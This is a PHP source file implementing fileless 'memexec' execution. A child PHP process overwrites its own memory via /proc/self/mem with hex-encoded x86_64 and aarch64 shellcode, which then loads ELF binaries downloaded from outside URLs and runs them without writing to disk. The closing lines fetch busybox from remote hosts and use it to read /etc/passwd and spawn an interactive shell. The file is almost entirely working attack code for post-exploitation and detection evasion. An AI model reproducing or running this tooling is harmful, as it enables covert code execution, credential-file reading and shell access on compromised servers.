<?php

// Code to execute by a php child process to ovewrite it's process with the stager shellcode
$executor='
preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
$vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
$vdso_dec = hexdec($vdso_addr);
$vdso_addr = bin2hex(strrev(hex2bin($vdso_addr))); // To little endian
$syscall = file_get_contents("/proc/self/syscall");
$syscall_array = explode(" ", $syscall);
$addr_dec = hexdec(trim($syscall_array[8]));
if(php_uname("m") == "x86_64")
{ // x64
    $jmp = hex2bin("48b8". $vdso_addr . "0000ffe0");
    $stager = hex2bin("41b90000000041b8ffffffff41ba22000000ba03000000be00100000bf00000000b8090000000f0589f24889c631c089c70f0531c00f054889f789d6ba0500000066b80a000f05ffe7");
} else { // Aarch64
    $jmp = hex2bin("4000005800001fd6". $vdso_addr . "0000");
    $stager = hex2bin("050080520400801243048052620080520100825200008052c81b8052010000d4e203012ae10300aae807805200008052010000d400008052010000d4e00301aae30301aae103022aa2008052481c8052010000d460001fd6");
}
$fd = fopen("/proc/self/mem", "r+");
fseek($fd, $vdso_dec);
fwrite($fd, $stager);
fseek($fd, $addr_dec);
fwrite($fd, $jmp);
fclose($fd);
';

// Run dhild process
$cmd_array = ['php', '-a'];
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => fopen('php://stdout', 'w'),
    2 => fopen('php://stderr', 'w'),
    3 => fopen('php://stdin' , 'w')
);

$process = proc_open($cmd_array, $descriptorspec, $pipes);
fwrite($pipes[0], $executor);
sleep(1);

// Memexecd shellcodes
if(php_uname("m") == "x86_64")
{
    $shellcode = "554889e54881ec2001000048c745d800000000488d85e8feffff4889c6488d056c0d00004889c7e8e70a0000488945d0488b45d0ba01000000488d0d5f0d00004889ce4889c7e86c0b0000488b55d04801c2488d85e8feffff4889c64889d7e8af0a0000488945c8488b45c8ba00000000be000040404889c7e842070000488945c0488b55b8488b45d04889d64889c7e8d50c0000488b95e8feffff488b45c84889d64889c7e8bf0c0000e9d10600008b85e0feffff85c00f84500100008b85e0feffff489848898568ffffff48838568ffffff0f4883a568fffffff04889e2488b8568ffffff48f7d84801d04889c44889e0488945b08b85e0feffff4863d0488b45b0be000000004889c7e83b0c00008b85e0feffff4863d0488b45b04889c6bf00000000e8520c0000c745e401000000488b45b0488945e8eb048345e401488b45e84889c7e8e00b00004883c001480145e88b85e0feffff4863d0488b45b04801d0483945e872d28b45e483c001489848c1e00348898560ffffff48838560ffffff0f4883a560fffffff04889e2488b8560ffffff48f7d84801d04889c44889e0488945f0c745e000000000488b45b0488945e8eb338b45e04898488d14c500000000488b45f04801c2488b45e8488902488b45e84889c7e84d0b00004883c001480145e88345e0018b45e03b45e47cc58b45e44898488d14c500000000488b45f04801d048c70000000000488d85e4feffffba040000004889c6bf00000000e8560b000048c78558ffffff1100000048c78550ffffff0000000048c78548ffffff0000000048c78540ffffff0000000048c78538ffffff00000000488bb550ffffff488b9548ffffff4c8b9540ffffff4c8b8538ffffff488bbd58ffffffb8380000000f0585c00f85060400008b85e4feffff48984889c7e8040a0000488945c8488d95f0feffff488b45c8be000040004889c7e804050000488945a8488b45c0488b5018488b45c04801d0488945a0488b45c8488b50188b85f0feffff83e00185c00f95c00fb6c0480faf45a84801d048894598488b45c80fb740380fb7c048894590488b45c80fb740360fb7c048894588488b45c8488b5020488b45a84801d0488945808b85e4feffff4863d0488b45c84889d64889c7e8290a000041b90000000041b8ffffffffb922000200ba03000000be00100200bf00000000e80c0a000048898578ffffff488b8578ffffff480500100200488945f848836df808488b45f848c700000000008b45e483e00185c0741048836df808488b45f848c70000000000c745e00000000048816df800040000488b45f848898570ffffff8b45e0489848c1e0044889c2488b8570ffffff4801d048c700060000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801d048c74008001000008b45e0489848c1e0044889c2488b8570ffffff4801d048c700190000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4598488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700090000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4598488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700070000008b85f0feffff83e00285c00f94c00fb6d08b45e08d4801894de0489848c1e0044889c1488b8570ffffff4801c14889d0480faf45c0488941088b45e0489848c1e0044889c2488b8570ffffff4801d048c700050000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4590488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700040000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4588488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700030000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801c2488b4580488942088b45e0489848c1e0044889c2488b8570ffffff4801d048c700000000008b45e08d50018955e0489848c1e0044889c2488b8570ffffff4801d048c740080000000048836df808488b45f848c7000000000048836df808488b45f848c700000000008b45e4489848c1e00348f7d8480145f88b45e44898488d14c500000000488b4df0488b45f84889ce4889c7e82507000048836df8088b45e44863d0488b45f8488910c78534ffffff03000000c78530ffffff000000008b8530ffffff48984889c6ba000000008b8534ffffff48984889c7b8240100000f05488b65f88b85f0feffff83e00285c07408488b4598ffe0eb06488b45a0ffe08b85e0feffff4898488985f8feffff488385f8feffff0f4883a5f8fefffff04889e2488b85f8feffff4801d04889c48b45e483c001489848c1e00348898500ffffff48838500ffffff0f4883a500fffffff04889e2488b8500ffffff4801d04889c4c78524ffffffffffffff48c78518ffffff00000000c78514ffffff0000000048c78508ffffff00000000488bb518ffffff8b8514ffffff48984889c24c8b9508ffffff8b8524ffffff48984889c7b83d0000000f05b86e0000000f0589852cffffffc78528ffffff120000008b8528ffffff48984889c68b852cffffff48984889c7b83e0000000f05488d85e0feffffba040000004889c6bf00000000e8e30500004883f8040f840cf9ffffc785f4feffff000000008b85f4feffff48984889c7b83c0000000f05554889e54881ecb00000004889bd68ffffff4889b560ffffff48899558ffffff48c745f80000000048c745f000000000488b8568ffffff488945d8488b45d8488b5020488b8568ffffff4801d0488945d0488b45d80fb74038668945ce488b8568ffffffba00000000488d0d770500004889ce4889c7e87c030000488945c04883bd58ffffff007417488b8558ffffff8b0083c80289c2488b8558ffffff8910488b45d80fb740106683f803752c4883bd58ffffff007417488b8558ffffff8b0083c80189c2488b8558ffffff8910488b8560ffffff488945f0c745ec00000000e9530200008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b0083f80375214883bd58ffffff007417488b8558ffffff8b0083e0fd89c2488b8558ffffff89108b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b0083f8010f85e00100008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b40048945bc8b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4008488945b08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4010488945a88b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4020488945e08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4028488945a0488b45a8482500f0ffff488945988b45bcc1e80283e00189c28b45bc83e00209c28b45bcc1e00283e00409d0894594488b45a8482b4598480145e0488b45a8482b4598480145a0488b4598482b45a8480145b0488b55f0488b4598488d3c02488b45a041b90000000041b8ffffffffb932000000ba030000004889c6e82003000048837db0007508488b4598488945f848837dc0007427488b45c0483b4598721d488b5598488b45e04801d0483945c0730c488b45c0482b4598488945e0488b9568ffffff488b45b0488d3402488b55f0488b4598488d0c02488b45e04889c24889cfe89b0200008b4594488b4df0488b55984801ca48895588488b55e04889558089857cffffff488b75808b857cffffff48984889c2488b7d88b80a0000000f05eb008345ec010fb745ce3945ec0f8ca0fdffff488b55f0488b45f84801d0c9c3554889e54883ec4048897dc8488975c0488b45c8ba000000004889c6bf9cffffffe8210200008945fc8b45fc8945ec48c745e000000000c745dc02000000488b45e04889c68b45dc48984889c28b45ec48984889c7b8080000000f054889c2488b45c0488910488b45c0488b008b55fc41b9000000004189d0b902000000ba010000004889c6bf00000000e8cf010000488945f08b45fc89c7e8b1010000488b45f0c9c3554889e54883ec5048897dc8488975c08955bc488b45c8488945f0488b45f0488b5028488b45c84801d0488945e8488b45f00fb7403c668945e6488b45f00fb7403e668945e40fb745e448c1e0064889c2488b45e84801d0488b5018488b45c84801d0488945d8c745fc00000000eb6d8b45fc489848c1e0064889c2488b45e84801d08b0089c2488b45d84801c2488b45c04889c64889d7e8e700000085c07538837dbc0074198b45fc489848c1e0064889c2488b45e84801d0488b4018eb2b8b45fc489848c1e0064889c2488b45e84801d0488b4010eb128345fc010fb745e63945fc7c8ab800000000c9c3554889e54883ec3048897dd848c745f00000000048c745f800000000488b45d841b90000000041b8ffffffffb922000000ba030000004889c6bf00000000e88b000000488945e8488b55e8488b45f8488d0c02488b45d84889c24889cebf00000000e872000000488945f0488b45f0480145f8488b45f0482945d848837dd80075c5488b45e8c9c331c031c9ffc9f2aef7d1678d41ffc357e8ebffffff5ff3a60f95c0480fb6c0c331c04889d1f3aac34889d1f3a4c3b8010100000f05c3b8030000000f05c3b80b0000000f05c34c87d1b8090000000f05c3b8000000000f05c34c87d1b8110000000f05c32f70726f632f73656c662f657865002e696e74657270002e62737300";
    $shellcode = hex2bin($shellcode);
} else {
    $shellcode = "fd7bada9fd030091bf8700f9a0630091e10300aa60760010ad020094a08300f92200805241760070a08340f9cf020094e10300aaa08340f90000018ba1630091a3020094a07f00f9020080d20108a8d2a07f40f9bb010094a07b00f9a17740f9a08340f98f030094a00f40f9e10300aaa07f40f98b030094a7010014a01340b91f000071000c0054a01340b9007c4093a04f00f9a04f40f9003c0091a04f00f9a04f40f900ec7c92a04f00f9e1030091a04f40f9e00300cb2000008b1f000091e0030091a07300f9a01340b9007c4093e20300aa01008052a07340f93b030094a01340b9007c4093e20300aaa17340f9000080527303009420008052a01701b9a07340f9a08f00f904000014a01741b900040011a01701b9a08f40f9f702009400040091a18f40f92000008ba08f00f9a01340b9007c4093a17340f92000008ba18f40f93f0000eb23feff54a01741b900040011007c409300f07dd3a04b00f9a04b40f9003c0091a04b00f9a04b40f900ec7c92a04b00f9e1030091a04b40f9e00300cb2000008b1f000091e0030091a09300f9bf1301b9a07340f9a08f00f910000014a01381b900f07dd3a19340f92000008ba18f40f9010000f9a08f40f9ce02009400040091a18f40f92000008ba08f00f9a01341b900040011a01301b9a11341b9a01741b93f00006bcbfdff54a01781b900f07dd3a19340f92000008b1f0000f9a0530091820080d2e10300aa000080522b030094200280d2a04700f9bf4300f9bf3f00f9bf3b00f9bf3700f9a14340f9a23f40f9a33b40f9a43740f9a04740f9881b80d2010000d41f000071811f0054a01740b9007c409384020094a07f00f9a0830091e20300aa0108a0d2a07f40f933010094a06f00f9a07b40f9000c40f9a17b40f92000008ba06b00f9a07f40f9010c40f9a02340b9000000121f000071e0079f1a001c0012021c4092a06f40f9407c009b2000008ba06700f9a07f40f900704079003c4092a06300f9a07f40f9006c4079003c4092a05f00f9a07f40f9001040f9a16f40f92000008ba05b00f9a01740b9007c4093e10300aaa07f40f9e7020094050080d204008012430480524300a07262008052010082d24100a0f2000080d2e2020094a05700f9a05740f900844091a09700f9a09740f9002000d1a09700f9a09740f91f0000f9a01741b9000000121f000071c0000054a09740f9002000d1a09700f9a09740f91f0000f9bf1301b9a09740f9000010d1a09700f9a09740f9a05300f9a01381b900ec7cd3a15340f92000008bc10080d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008b010082d2010400f9a01381b900ec7cd3a15340f92000008b210380d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba16740f9010400f9a01381b900ec7cd3a15340f92000008b210180d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba16740f9010400f9a01381b900ec7cd3a15340f92000008be10080d2010000f9a02340b900001f121f000071e0179f1a001c0012021c4092a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba17b40f9417c019b010400f9a01381b900ec7cd3a15340f92000008ba10080d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba16340f9010400f9a01381b900ec7cd3a15340f92000008b810080d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba15f40f9010400f9a01381b900ec7cd3a15340f92000008b610080d2010000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008ba15b40f9010400f9a01381b900ec7cd3a15340f92000008b1f0000f9a01341b901040011a11301b9007c409300ec7cd3a15340f92000008b1f0400f9a09740f9002000d1a09700f9a09740f91f0000f9a09740f9002000d1a09700f9a09740f91f0000f9a01781b900f07dd3e00300cba19740f92000008ba09700f9a01781b900f07dd3e20300aaa19340f9a09740f913020094a09740f9002000d1a09700f9a11781b9a09740f9010000f960008052a06700b9bf6300b9a06380b9e10300aa020080d2a06780b9080380d2010000d4a09740f91f000091a02340b900001f121f00007180000054a06740f900001fd603000014a06b40f900001fd6a01340b9007c4093a01700f9a01740f9003c0091a01700f9a01740f900ec7c92a01700f9e1030091a01740f92000008b1f0000911f2003d5a01741b900040011007c409300f07dd3a01b00f9a01b40f9003c0091a01b00f9a01b40f900ec7c92a01b00f9e1030091a01b40f92000008b1f0000911f2003d500008012a05700b9bf2700f9bf4700b9bf1f00f9a12740f9a04780b9e20300aaa31f40f9a05780b9882080d2010000d4a81580d2010000d4a05f00b940028052a05b00b9a05b80b9e10300aaa05f80b9281080d2010000d41f2003d5a0430091820080d2e10300aa00008052e70100941f1000f180caff54bf2700b9a02780b9a80b80d2010000d4fd7bb4a9fd030091e01700f9e11300f9e20f00f9ff5f00f9ff5b00f9e01740f9e04f00f9e04f40f9001040f9e11740f92000008be04b00f9e04f40f900704079e01f017902008052613b0070e01740f9f6000094e04300f9e00f40f91f0000f1c0000054e00f40f9000040b901001f32e00f40f9010000b9e04f40f9002040791f0c007161010054e00f40f91f0000f1c0000054e00f40f9000040b901000032e00f40f9010000b9e01340f9e05b00f9ffaf00b9ad000014e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b000040b91f0c007121010054e00f40f91f0000f1c0000054e00f40f9000040b901781e12e00f40f9010000b9e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b000040b91f04007161110054e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b000440b9e07f00b9e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b000440f9e03b00f9e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b000840f9e03700f9e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b001040f9e05300f9e1af80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04b40f90000018b001440f9e03300f9e03740f900cc7492e02f00f9e07f40b9007c025301000012e07f40b900001f122100002ae07f40b900741e5300001e122000002ae05700b9e13740f9e02f40f9200000cbe15340f92000008be05300f9e13740f9e02f40f9200000cbe13340f92000008be03300f9e12f40f9e03740f9200000cbe13b40f92000008be03b00f9e15b40f9e02f40f92000008b050080d2040080124306805262008052e13340f936010094e03b40f91f0000f161000054e02f40f9e05f00f9e04340f91f0000f1e0010054e14340f9e02f40f93f0000eb63010054e12f40f9e05340f92000008be14340f93f0000eba2000054e14340f9e02f40f9200000cbe05300f9e15b40f9e02f40f92300008be11740f9e03b40f92000008be25340f9e10300aae00303aaf2000094e15b40f9e02f40f92100008be05740b9e12700f9e15340f9e12300f9e03f00b9e12340f9e03f80b9e20300aae02740f9481c80d2010000d4020000141f2003d5e0af40b900040011e0af00b9e01f4179e1af40b93f00006b2beaff54e15b40f9e05f40f92000008bfd7bcca8c0035fd6fd7bbba9fd030091e00f00f9e10b00f902008052e10f40f9600c8012e6000094e04f00b9e04f40b9e03f00b9ff1b00f940008052e02f00b9e01b40f9e10300aae02f80b9e20300aae03f80b9c80780d2010000d4e10300aae00b40f9010000f9e00b40f9000040f9050080d2e44f40b94300805222008052e10300aa000080d2d9000094e02300f9e04f40b9ce000094e02340f9fd7bc5a8c0035fd6fd7bbaa9fd030091e01700f9e11300f9e21f00b9e01740f9e02b00f9e02b40f9001440f9e11740f92000008be02700f9e02b40f900784079e08f0079e02b40f9007c4079e08b0079e08b407900e47ad3e12740f92000008b000c40f9e11740f92000008be01f00f9ff5f00b91f000014e05f80b900e47ad3e12740f92000008b000040b9e003002ae11f40f92000008be11340f94f0000941f00007101020054e01f40b91f000071e0000054e05f80b900e47ad3e12740f92000008b000c40f90f000014e05f80b900e47ad3e12740f92000008b000840f909000014e05f40b900040011e05f00b9e08f4079e15f40b93f00006bebfbff54000080d2fd7bc6a8c0035fd6fd7bbca9fd030091e00f00f9ff1b00f9ff1f00f9050080d2040080124304805262008052e10f40f9000080d286000094e01700f9e11740f9e01f40f92000008be20f40f9e10300aa0000805282000094e01b00f9e11f40f9e01b40f92000008be01f00f9e10f40f9e01b40f9200000cbe00f00f9e00f40f91f0000f1c1fdff54e01740f9fd7bc4a8c0035fd6ff8300d1e00700f9ff0f00f904000014e00f40f900040091e00f00f9e10740f9e00f40f92000008b000040391f00007101ffff54e00f40f9ff830091c0035fd6ff8300d1e00700f9e10300f9ff0f00f904000014e00f40f900040091e00f00f9e10740f9e00f40f92000008b00004039e203002ae10340f9e00f40f92000008b000040394000004be01700b91f000071a1010054e10740f9e00f40f92000008b000040391f000071e0000054e10340f9e00f40f92000008b000040391f000071a1fcff54e01740b9ff830091c0035fd6ffc300d1e00f00f9e11700b9e20700f9ff1700f90a000014e01740f9e10f40f92000008be11740b9211c001201000039e01740f900040091e01700f9e01740f9e10740f93f0000eb88feff54e00f40f9ffc30091c0035fd6ffc300d1e00f00f9e10b00f9e20700f9ff1700f90c000014e01740f9e10b40f92100008be01740f9e20f40f94000008b2100403901000039e01740f900040091e01700f9e01740f9e10740f93f0000eb48feff54e00f40f9ffc30091c0035fd6080780d2010000d41f2003d5c0035fd6280780d2010000d41f2003d5c0035fd6e81a80d2010000d41f2003d5c0035fd6c81b80d2010000d41f2003d5c0035fd6e80780d2010000d41f2003d5c0035fd6680880d2010000d41f2003d5c0035fd62f70726f632f73656c662f657865002e696e74657270002e62737300";
    $shellcode = hex2bin($shellcode);
}

// Send sc to the child php process so it's run by the stager
fwrite($pipes[0], $shellcode);

// Prepare memexec function
$GLOBALS['pipe'] = $pipes[0];
function memexec($url, $argv = [], $stop = true)
{
    $args = "";
    foreach($argv as &$arg)
        $args .= $arg . "\0";
    unset($arg);

    $f = fopen($url, "r");
    $binary = "";
    while(!feof($f))
        $binary .= fread($f, 2048);
    fclose($f);

    $args = pack('V', strlen($args)) . $args . pack('V', strlen($binary));
    fwrite($GLOBALS['pipe'], $args);
    fwrite($GLOBALS['pipe'], $binary);
    if($stop) posix_kill(posix_getpid(), 19);
}

memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busybox", ["ls", "-la", "/"], false); //PIE
memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["ls", "-la", "/"], false); // No PIE
memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["cat", "/etc/passwd"], false);
memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["sh","-i"], true);
